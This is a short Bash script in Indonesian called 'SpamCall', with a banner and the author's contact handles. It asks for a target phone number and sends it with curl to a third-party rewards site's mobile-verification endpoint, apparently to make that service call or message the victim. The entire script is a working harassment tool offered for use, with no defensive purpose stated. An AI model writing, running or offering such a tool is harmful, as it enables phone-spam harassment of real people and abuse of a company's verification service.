#!bin/bash
clear

figlet SpamCall | lolcat
echo "========================="
echo "[+] Author   : KUDILxGmz "
echo "[+] Whatsapp : 08154xxxx "
echo "[+] Instagram: fadillboys"
echo "========================="
echo '
Pilih Menu
----------------------
  [1] SpamCall !!
  [0] Keluar Tools
----------------------

(Contoh Masukan Nomor: 81234567890)
'
echo
read -p "Pilih Menu   : " pil
if [[ $pil == 1 ]]; then
read -p "Nomor Target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s  $link
else
echo 'TERIMAKASIH TELAH MENGGUNAKAN TOOLS SAYA :)'
exit
fi
echo
